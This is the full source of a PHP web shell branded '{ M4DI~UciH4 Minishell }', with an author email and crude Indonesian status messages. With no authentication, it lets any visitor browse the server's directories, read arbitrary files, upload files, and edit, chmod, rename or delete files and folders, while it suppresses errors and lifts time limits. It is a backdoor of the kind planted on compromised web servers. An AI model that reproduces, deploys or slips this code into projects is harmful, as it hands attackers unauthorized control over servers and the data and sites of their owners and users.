<?php

    @ini_set('output_buffering', 0);
    @ini_set('display_errors', 0);
    set_time_limit(0);
    error_reporting(0);
        ini_set('memory_limit', '64M');
        header('Content-Type: text/html; charset=UTF-8');
        if (get_magic_quotes_gpc()) {
            foreach ($_POST as $key => $value) {
                $_POST[$key] = stripslashes($value);
            }
        }
        echo "<!DOCTYPE HTML>\r\n<HTML>\r\n<HEAD>\r\n<center><font color=\"red\" face=\"Iceland\"><font color=\"#47FF0F\" face=\"Ubuntu\"></font></footer></tr></table>\r\n</style>\r\n<link href=\"https://fonts.googleapis.com/css?family=Iceland\" rel=\"stylesheet\">\r\n<link href=\"https://fonts.googleapis.com/css?fsmily=Ubuntu\" rel=\"stylesheet\"/>\r\n<title>{ M4DI~UciH4 Minishell }</title>\r\n\r\n<style>\r\nbody {\r\n    background-color: #000000;\r\nfont-family: Ubuntu;\r\nbackground-color: #000000;\r\ntext-shadow:0px 0px 1px #ffffff;\r\n}\r\n#content tr:hover{\r\nbackground-color: #ffffff;\r\ntext-shadow:0px 0px 10px ##339900;\r\n}\r\n#content .first{\r\nbackground-color: #000000;\r\n}\r\n#content .first:hover{\r\nbackground-color: #ffffff;\r\ntext-shadow:0px 0px 1px #339900;\r\n}\r\ntable{\r\nborder: 1px #ffffff dotted;\r\n}\r\nH1{\r\nfont-family: Ubuntu;\r\n}\r\na{\r\ncolor: #ffffff;\r\ntext-decoration: none;\r\n}\r\na:hover{\r\ncolor: white;\r\ntext-shadow:0px 0px 10px #339900;\r\n}\r\ninput,select,textarea{\r\nborder: 1px #ffffff solid;\r\n-moz-border-radius: 5px;\r\n-webkit-border-radius:5px;\r\nborder-radius:5px;\r\n}\r\n</style>\r\n</HEAD>\r\n<font face=\"Iceland\" size=\"7\" color=\"snow\">{ M4DI~UciH4 Minishell }</font><br>\r\n<font face=\"Iceland\" size=\"3\" color=\"snow\">maulidazha587@gmail.com</font><br><br>\r\n<BODY>\r\n<table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">\r\n<tr><td>Path >>  ";
        if (isset($_GET['path'])) {
            $path = $_GET['path'];
        } else {
            $path = getcwd();
        }
        $path = str_replace('\\', '/', $path);
        $paths = explode('/', $path);
        foreach ($paths as $id => $pat) {
            if ($pat == '' && $id == 0) {
                $a = true;
                echo "<a href=\"?path=/\">/</a>";
                continue;
            }
            if ($pat == '') {
                continue;
            }
            echo "<a href=\"?path=";
            for ($i = 0; $i <= $id; $i++) {
                echo "{$paths[$i]}";
                if ($i != $id) {
                    echo "/";
                }
            }
            echo '">' . $pat . '</a>/';
        }
        echo "</td></tr><tr><td>";
        if (isset($_FILES['file'])) {
            if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
                echo "<font color=\"green\">Upload Berhasil Ajg !!</font><br />";
            } else {
                echo "<font color=\"red\">Upload Gagal Ngntd !!</font><br />";
            }
        }
        echo "<form enctype=\"multipart/form-data\" method=\"POST\">\r\nUpload >> <input type=\"file\" name=\"file\" />\r\n<input type=\"submit\" value=\"Upload Bangsat!\" />\r\n</form>\r\n</td></tr>";
        if (isset($_GET['filesrc'])) {
            echo "<tr><td>files >> ";
            echo $_GET['filesrc'];
            echo "</tr></td></table><br />";
            echo '<pre>' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</pre>';
        } elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
            echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
            if ($_POST['opt'] == 'chmod') {
                if (isset($_POST['perm'])) {
                    if (chmod($_POST['path'], $_POST['perm'])) {
                        echo "<font color=\"white\">Change Permission Berhasil Ajg !!</font><br />";
                    } else {
                        echo "<font color=\"red\">Change Permission Gagal Ngntd !!</font><br />";
                    }
                }
                echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Lanjut" />
</form>';
            } elseif ($_POST['opt'] == 'rename') {
                if (isset($_POST['newname'])) {
                    if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                        echo "<font color=\"white\">Change Name Berhasil Ajg !!</font><br />";
                    } else {
                        echo "<font color=\"red\">Change Name Gagal Ngntd !!</font><br />";
                    }
                    $_POST['name'] = $_POST['newname'];
                }
                echo '<form method="POST">
New Name : <input name="newname" type="text" size="3" value="' . $_POST['name'] . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Lanjut" />
</form>';
            } elseif ($_POST['opt'] == 'edit') {
                if (isset($_POST['src'])) {
                    $fp = fopen($_POST['path'], 'w');
                    if (fwrite($fp, $_POST['src'])) {
                        echo "<font color=\"white\">Edit Berhasil Ajg !!</font><br />";
                    } else {
                        echo "<font color=\"red\">Edit Gagal Ngntd !!</font><br />";
                    }
                    fclose($fp);
                }
                echo '<form method="POST">
<textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Lanjut" />
</form>';
            }
            echo "</center>";
        } else {
            echo "</table><br /><center>";
            if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
                if ($_POST['type'] == 'dir') {
                    if (rmdir($_POST['path'])) {
                        echo "<font color=\"white\">Delete Berhasil !!</font><br />";
                    } else {
                        echo "<font color=\"red\">Delete Gagal !!</font><br />";
                    }
                } elseif ($_POST['type'] == 'file') {
                    if (unlink($_POST['path'])) {
                        echo "<font color=\"white\">Delete File Berhasil !!</font><br />";
                    } else {
                        echo "<font color=\"red\">Delete File Gagal !!</font><br />";
                    }
                }
            }
            echo "</center>";
            $scandir = scandir($path);
            echo "<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">\r\n<tr class=\"first\">\r\n<td><center>Name</center></td>\r\n<td><center>Size</center></td>\r\n<td><center>Permissions</center></td>\r\n<td><center>Options</center></td>\r\n</tr>";
            foreach ($scandir as $dir) {
                if (!is_dir("{$path}/{$dir}") || $dir == '.' || $dir == '..') {
                    continue;
                }
                echo "<tr>\r\n<td><a href=\"?path={$path}/{$dir}\">{$dir}</a></td>\r\n<td><center>--</center></td>\r\n<td><center>";
                if (is_writable("{$path}/{$dir}")) {
                    echo "<font color=\"green\">";
                } elseif (!is_readable("{$path}/{$dir}")) {
                    echo "<font color=\"red\">";
                }
                echo perms("{$path}/{$dir}");
                if (is_writable("{$path}/{$dir}") || !is_readable("{$path}/{$dir}")) {
                    echo "</font>";
                }
                echo "</center></td>\r\n<td><center><form method=\"POST\" action=\"?option&path={$path}\">\r\n<select name=\"opt\">\r\n<option value=\"\"></option>\r\n<option value=\"delete\">Delete</option>\r\n<option value=\"chmod\">Chmod</option>\r\n<option value=\"rename\">Rename</option>\r\n</select>\r\n<input type=\"hidden\" name=\"type\" value=\"dir\">\r\n<input type=\"hidden\" name=\"name\" value=\"{$dir}\">\r\n<input type=\"hidden\" name=\"path\" value=\"{$path}/{$dir}\">\r\n<input type=\"submit\" value=\">\" />\r\n</form></center></td>\r\n</tr>";
            }
            echo "<tr class=\"first\"><td></td><td></td><td></td><td></td></tr>";
            foreach ($scandir as $file) {
                if (!is_file("{$path}/{$file}")) {
                    continue;
                }
                $size = filesize("{$path}/{$file}") / 1024;
                $size = round($size, 3);
                if ($size >= 1024) {
                    $size = round($size / 1024, 2) . ' MB';
                } else {
                    $size .= ' KB';
                }
                echo "<tr>\r\n<td><a href=\"?filesrc={$path}/{$file}&path={$path}\">{$file}</a></td>\r\n<td><center>" . $size . "</center></td>\r\n<td><center>";
                if (is_writable("{$path}/{$file}")) {
                    echo "<font color=\"green\">";
                } elseif (!is_readable("{$path}/{$file}")) {
                    echo "<font color=\"red\">";
                }
                echo perms("{$path}/{$file}");
                if (is_writable("{$path}/{$file}") || !is_readable("{$path}/{$file}")) {
                    echo "</font>";
                }
                echo "</center></td>\r\n<td><center><form method=\"POST\" action=\"?option&path={$path}\">\r\n<select name=\"opt\">\r\n<option value=\"Action\">Action</option>\r\n<option value=\"delete\">Delete</option>\r\n<option value=\"chmod\">Chmod</option>\r\n<option value=\"rename\">Rename</option>\r\n<option value=\"edit\">Edit</option>\r\n</select>\r\n<input type=\"hidden\" name=\"type\" value=\"file\">\r\n<input type=\"hidden\" name=\"name\" value=\"{$file}\">\r\n<input type=\"hidden\" name=\"path\" value=\"{$path}/{$file}\">\r\n<input type=\"submit\" value=\">\" />\r\n</form></center></td>\r\n</tr>";
            }
            echo "</table>\r\n</div>";
        }
        echo "\r\n</BODY>\r\n</HTML>";
        function perms($file)
        {
            $perms = fileperms($file);
            if (($perms & 0xc000) == 0xc000) {
                // Socket
                $info = 's';
            } elseif (($perms & 0xa000) == 0xa000) {
                // Symbolic Link
                $info = 'l';
            } elseif (($perms & 0x8000) == 0x8000) {
                // Regular
                $info = '-';
            } elseif (($perms & 0x6000) == 0x6000) {
                // Block special
                $info = 'b';
            } elseif (($perms & 0x4000) == 0x4000) {
                // Directory
                $info = 'd';
            } elseif (($perms & 0x2000) == 0x2000) {
                // Character special
                $info = 'c';
            } elseif (($perms & 0x1000) == 0x1000) {
                // FIFO pipe
                $info = 'p';
            } else {
                // Unknown
                $info = 'u';
            }
            $info .= $perms & 0x100 ? 'r' : '-';
            $info .= $perms & 0x80 ? 'w' : '-';
            $info .= $perms & 0x40 ? $perms & 0x800 ? 's' : 'x' : ($perms & 0x800 ? 'S' : '-');
            $info .= $perms & 0x20 ? 'r' : '-';
            $info .= $perms & 0x10 ? 'w' : '-';
            $info .= $perms & 0x8 ? $perms & 0x400 ? 's' : 'x' : ($perms & 0x400 ? 'S' : '-');
            $info .= $perms & 0x4 ? 'r' : '-';
            $info .= $perms & 0x2 ? 'w' : '-';
            $info .= $perms & 0x1 ? $perms & 0x200 ? 't' : 'x' : ($perms & 0x200 ? 'T' : '-');
            return $info;
        }
?>